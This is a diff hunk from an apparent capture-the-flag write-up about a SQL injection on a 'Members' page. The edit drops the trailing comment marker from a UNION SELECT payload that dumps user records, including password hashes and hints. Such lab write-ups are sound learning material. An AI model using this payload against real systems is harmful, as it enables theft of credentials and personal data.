@@ -27,7 +27,7 @@ A SQL Injection vulnerability found on the Members page allows attackers to expl
 - Result: Lists table/column names (e.g., `users`, `user_id`, `first_name`, `Commentaire`, `countersign`, etc.)
 
 ### 4. Dump User Data
-- Query: `-1 UNION SELECT concat(Commentaire, countersign), concat(user_id,first_name,last_name, country,town,planet) FROM users --`
+- Query: `-1 UNION SELECT concat(Commentaire, countersign), concat(user_id,first_name,last_name, country,town,planet) FROM users`
 - Result: Exposes sensitive data, including password hashes and hints.
 
 ### 5. Crack the Flag
